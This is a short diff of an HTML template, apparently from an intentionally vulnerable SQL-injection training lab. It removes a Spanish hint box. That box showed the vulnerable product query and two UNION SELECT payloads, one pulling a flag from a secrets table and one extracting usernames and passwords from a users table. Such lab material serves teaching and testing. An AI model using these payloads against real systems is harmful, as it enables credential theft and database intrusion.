@@ -37,12 +37,4 @@
   </table>
 </div>
 {% endif %}
-<div class="hint-box mt-2">
-  <div class="hint-title">💡 Pista</div>
-  <p>
-    Query: <code>SELECT id, name, category FROM products WHERE category='[q]'</code><br>
-    Payload: <code>x' UNION SELECT 1,flag,name FROM secret_flags-- </code><br>
-    O extrae usuarios: <code>x' UNION SELECT id,username,password FROM users-- </code>
-  </p>
-</div>
 {% endblock %}
